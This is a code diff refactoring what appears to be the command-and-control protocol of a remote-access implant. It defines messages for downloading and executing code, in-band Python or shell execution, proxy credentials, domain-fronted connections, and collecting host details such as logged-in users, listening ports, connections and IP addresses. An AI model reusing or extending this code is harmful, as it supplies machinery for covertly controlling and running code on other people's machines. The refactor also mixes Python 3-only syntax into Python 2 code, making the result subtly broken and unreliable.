@@ -80,8 +80,6 @@ class PayloadTooBig(Exception):
     def __init__(self, message, required_len, max_len):
         return super(PayloadTooBig, self).__init__(message.format(
             required_len=required_len, max_len=max_len))
-        self.required_len = required_len
-        self.max_len = max_len
 
 
 class UnregisteredTargetId(PackError):
@@ -102,25 +100,24 @@ class AddressTable(object):
         raise UnregisteredTargetId(address)
 
     def get_address(self, target_id):
-        address = None
-        for this_address, this_target_id in self.table.iteritems():
-            if this_target_id == target_id:
-                address = this_address
-                break
-
+        address = next(
+            (
+                this_address
+                for this_address, this_target_id in self.table.iteritems()
+                if this_target_id == target_id
+            ),
+            None,
+        )
         if address is None:
             raise UnregisteredTargetId(target_id)
 
         return address
 
     def _find_free_target_id(self):
-        auto_target_id_is_ok = True
-
-        for used_target_id in self.table.itervalues():
-            if self.auto_target_id == used_target_id:
-                auto_target_id_is_ok = False
-                break
-
+        auto_target_id_is_ok = all(
+            self.auto_target_id != used_target_id
+            for used_target_id in self.table.itervalues()
+        )
         if auto_target_id_is_ok:
             target_id = self.auto_target_id
             self.auto_target_id = (self.auto_target_id + 1) % 0xFFFF
@@ -208,8 +205,13 @@ class Command(object):
         }
 
     def __repr__(self):
-        return '{' + self.__class__.__name__ + ': ' + ' '.join(
-            '{}={}'.format(slot.upper(), getattr(self, slot)) for slot in self.__slots__
+        return (
+            '{'
+            + self.__class__.__name__
+            + ': '
+            + ' '.join(
+                f'{slot.upper()}={getattr(self, slot)}' for slot in self.__slots__
+            )
         ) + '}'
 
 
@@ -248,9 +250,7 @@ class SystemStatus(Command):
         else:
             self.users = int(users)
 
-        if self.users > 255:
-            self.users = 255
-
+        self.users = min(self.users, 255)
         if mem is None:
             try:
                 self.mem = int(psutil.virtual_memory().percent)
@@ -268,44 +268,38 @@ class SystemStatus(Command):
 
         if listen is None:
             if net_connections:
-                self.listen = len(set([
-                    x.laddr[1] for x in net_connections
-                    if x.status == 'LISTEN'
-                ]))
+                self.listen = len(
+                    {x.laddr[1] for x in net_connections if x.status == 'LISTEN'}
+                )
             else:
                 self.listen = 0
         else:
             self.listen = int(listen)
 
-        if self.listen > 255:
-            self.listen = 255
-
+        self.listen = min(self.listen, 255)
         if remote is None:
             if net_connections:
-                self.remote = len(set([
-                    x.raddr for x in net_connections \
-                    if x.status=='ESTABLISHED' and x.raddr[0] not in (
-                        '127.0.0.1', '::ffff:127.0.0.1'
-                    )
-                ]))
+                self.remote = len(
+                    {
+                        x.raddr
+                        for x in net_connections
+                        if x.status == 'ESTABLISHED'
+                        and x.raddr[0] not in ('127.0.0.1', '::ffff:127.0.0.1')
+                    }
+                )
             else:
                 self.remote = 0
         else:
             self.remote = int(remote)
 
-        if self.remote > 255:
-            self.remote = 255
-
+        self.remote = min(self.remote, 255)
         if idle is None:
             if uidle is None:
                 self.idle = True
             else:
                 try:
                     idle = uidle.get_idle()
-                    if idle is None:
-                        self.idle = True
-                    else:
-                        self.idle = idle > 60*10
+                    self.idle = True if idle is None else idle > 60*10
                 except:
                     self.idle = True
         else:
@@ -484,7 +478,7 @@ class Kex(Command):
 
     @property
     def spi(self):
-        return struct.unpack('>I', self.parcel[0:4])[0]
+        return struct.unpack('>I', self.parcel[:4])[0]
 
     @staticmethod
     def unpack(data):
@@ -664,32 +658,21 @@ class SetProxy(Command):
         ip = netaddr.IPAddress(ip)
         data = data[sip:]
 
-        user = ''
-        password = ''
-
         user_len = ord(data[0])
-        if user_len:
-            user = data[1:1+user_len]
-
+        user = data[1:1+user_len] if user_len else ''
         data = data[1+user_len:]
 
         pass_len = ord(data[0])
-        if pass_len:
-            password = data[1:1+pass_len]
-
+        password = data[1:1+pass_len] if pass_len else ''
         return SetProxy(scheme, ip, port, user, password), sip+user_len+pass_len+2
 
     def __repr__(self):
-        if self.scheme == 'none':
-            return '{{PROXY: DISABLED}}'
-        elif self.scheme == 'any':
+        if self.scheme == 'any':
             return '{{PROXY: ENABLED}}'
 
-        if self.user and self.password:
-            auth = '{}:{}@'.format(self.user, self.password)
-        else:
-            auth = ''
-
+        elif self.scheme == 'none':
+            return '{{PROXY: DISABLED}}'
+        auth = f'{self.user}:{self.password}@' if self.user and self.password else ''
         return '{{PROXY: {}://{}{}:{}}}'.format(
             self.scheme, auth, self.ip, self.port
         )
@@ -720,12 +703,11 @@ class Connect(Command):
         message = b''
         if self.well_known_transports.is_registered(self.transport):
             code = (1 << 7) | self.well_known_transports.encode(self.transport)
-            message = message + struct.pack('B', code)
+            message += struct.pack('B', code)
         else:
             code = len(self.transport)
             if code > 0x7F:
-                raise PackError(
-                    'Transport name {} can not be encoded'.format(self.transport))
+                raise PackError(f'Transport name {self.transport} can not be encoded')
 
             message = message + struct.pack('B', code) + self.transport
 
@@ -780,7 +762,7 @@ class DownloadExec(Command):
         try:
             action = self.well_known_downloadexec_action.encode(self.action)
         except:
-            raise PackError('Unknown action: {}'.format(self.action))
+            raise PackError(f'Unknown action: {self.action}')
 
         url = urlparse.urlparse(self.url)
 
@@ -789,15 +771,11 @@ class DownloadExec(Command):
         except:
             addr = netaddr.IPAddress(socket.gethostbyname(url.hostname))
 
-        if not addr.version == 4:
+        if addr.version != 4:
             raise PackError('IPv6 unsupported')
 
         addr = int(addr)
-        if url.port:
-            port = int(url.port)
-        else:
-            port = 0
-
+        port = int(url.port) if url.port else 0
         path = url.path
 
         if len(path) > 16:
@@ -806,7 +784,7 @@ class DownloadExec(Command):
         try:
             scheme = self.well_known_downloadexec_scheme.encode(url.scheme)
         except EncodingTableUnregisteredElement:
-            raise PackError('Unknown scheme: {}'.format(url.scheme))
+            raise PackError(f'Unknown scheme: {url.scheme}')
 
         code = (self.proxy << 5) | (action << 3) | scheme
 
@@ -827,13 +805,12 @@ class DownloadExec(Command):
         scheme = DownloadExec.well_known_downloadexec_scheme.decode(code & 7)
         proxy = bool((code >> 5) & 1)
         host = str(netaddr.IPAddress(addr))
-        port = ':{}'.format(port) if port else (
-            '' if scheme in ('http', 'ftp', 'https') else 53
-        )
+        port = f':{port}' if port else '' if scheme in ('http', 'ftp', 'https') else 53
         path = data[bsize:bsize+plen]
-        return DownloadExec('{}://{}{}{}'.format(
-            scheme, host, port, path
-        ), action, proxy), bsize+plen
+        return (
+            DownloadExec(f'{scheme}://{host}{port}{path}', action, proxy),
+            bsize + plen,
+        )
 
 
 class PasteLink(Command):
@@ -911,8 +888,7 @@ class PasteLink(Command):
             raise PackError('User-defined actions are not supported')
 
         for (service, encode, decode), code in self.well_known_paste_services_encode.iteritems():
-            match = re.match(service.format('(.*)'), self.url)
-            if match:
+            if match := re.match(service.format('(.*)'), self.url):
                 paste = encode(match.groups()[0])
                 message = struct.pack(
                     'BB',
@@ -986,10 +962,7 @@ class OnlineStatus(Command):
 
         if result['ntp']:
             if self.offset in (32767, -32768):
-                word = 'MAX'
-                if self.offset < 0:
-                    word = 'MIN'
-
+                word = 'MIN' if self.offset < 0 else 'MAX'
                 result.update({
                     'ntp-offset': word
                 })
@@ -1009,9 +982,13 @@ class OnlineStatus(Command):
             ' '.join(
                 '{}={}'.format(
                     k.upper(),
-                    v if type(v) in (int,str,unicode,bool) else any([
-                        x for x in v.itervalues()
-                    ])) for k,v in self.get_dict().iteritems()))
+                    v
+                    if type(v) in (int, str, unicode, bool)
+                    else any(list(v.itervalues())),
+                )
+                for k, v in self.get_dict().iteritems()
+            )
+        )
 
 
 class PortQuizPort(Command):
@@ -1224,15 +1201,8 @@ class SystemInfoEx(Command):
             self.boottime = boottime
             self.internet = internet
 
-            if external_ip:
-                self.external_ip = netaddr.IPAddress(external_ip)
-            else:
-                self.external_ip = None
-
-            if internal_ip:
-                self.internal_ip = netaddr.IPAddress(internal_ip)
-            else:
-                self.internal_ip = None
+            self.external_ip = netaddr.IPAddress(external_ip) if external_ip else None
+            self.internal_ip = netaddr.IPAddress(internal_ip) if internal_ip else None
 
     def pack(self):
         # 1b Version
@@ -1334,8 +1304,7 @@ class SystemInfoEx(Command):
         if version == 1:
             return SystemInfoEx._unpack_v1(data)
         else:
-            raise NotImplementedError(
-                'SystemInfoEx: Unsupported version {}'.format(version))
+            raise NotImplementedError(f'SystemInfoEx: Unsupported version {version}')
 
     def __repr__(self):
         return '{{SYSEX: OS={} ARCH={} NODE={:012X} IP={}/{} ' \
@@ -1391,8 +1360,7 @@ class ConnectEx(Command):
             self.address_type = ConnectEx.TARGET_ID
 
         else:
-            raise NotImplementedError(
-                'Unsupported address type {}'.format(type(address)))
+            raise NotImplementedError(f'Unsupported address type {type(address)}')
 
         self.port = int(port)
         self.transport = transport
@@ -1400,8 +1368,11 @@ class ConnectEx(Command):
 
     def __repr__(self):
         return '{{CONNECT_EX {}:{} {}{}}}'.format(
-            self.address, self.port, self.transport,
-            ' FRONT={}'.format(self.fronting) if self.fronting else '')
+            self.address,
+            self.port,
+            self.transport,
+            f' FRONT={self.fronting}' if self.fronting else '',
+        )
 
     def pack(self):
         address = None
@@ -1415,11 +1386,12 @@ class ConnectEx(Command):
 
         if self.fronting:
             if type(self.fronting) in (long, int) and \
-                    self.fronting > 0 and self.fronting < 65536:
+                        self.fronting > 0 and self.fronting < 65536:
                 fronting = struct.pack('>H', self.fronting)
             else:
                 raise NotImplementedError(
-                    'Address type {} is not supported'.format(type(self.fronting)))
+                    f'Address type {type(self.fronting)} is not supported'
+                )
 
         port = struct.pack('>H', self.port)
         transport = self.well_known_transports.encode(self.transport)
@@ -1634,8 +1606,6 @@ class InBandExecute(object):
             return 'download+exec'
         elif self.method == InBandExecute.METHOD_PYTHON_EXECUTE:
             return 'python'
-        elif self.method == InBandExecute.METHOD_PYTHON_EXECUTE:
-            return 'sh'
         else:
             return 'INVALID'
 
@@ -1665,7 +1635,9 @@ class Error(Command):
         return struct.pack('B', self.errors.encode(self.error) << 5 | len(self.message))+self.message
 
     def __repr__(self):
-        return '{{{}{}}}'.format(self.error, ': '+self.message if self.message else '')
+        return '{{{}{}}}'.format(
+            self.error, f': {self.message}' if self.message else ''
+        )
 
     @staticmethod
     def unpack(data):
@@ -1716,7 +1688,7 @@ class ParcelInvalidCommand(Exception):
         self.command = command
 
     def __repr__(self):
-        return 'Unknown command: {}'.format(self.command)
+        return f'Unknown command: {self.command}'
 
 
 class Parcel(object):
@@ -1776,7 +1748,7 @@ class Parcel(object):
         return gen_csum(data, nonce) + data
 
     def __repr__(self):
-        return '|PARCEL: {}|'.format(str(self.commands))
+        return f'|PARCEL: {str(self.commands)}|'
 
     @staticmethod
     def unpack(data, nonce, check_csum=None):
@@ -1786,8 +1758,7 @@ class Parcel(object):
         messages = []
 
         if len(data) < 4:
-            raise ParcelInvalidPayload(
-                'Too small payload: {}'.format(len(data)))
+            raise ParcelInvalidPayload(f'Too small payload: {len(data)}')
 
         csum_data, data = data[:4], data[4:]
 
@@ -1803,6 +1774,6 @@ class Parcel(object):
                 data = data[offt:]
 
         except struct.error as e:
-            raise ParcelInvalidPayload('Unpack Failed: {}'.format(e))
+            raise ParcelInvalidPayload(f'Unpack Failed: {e}')
 
         return Parcel(messages)
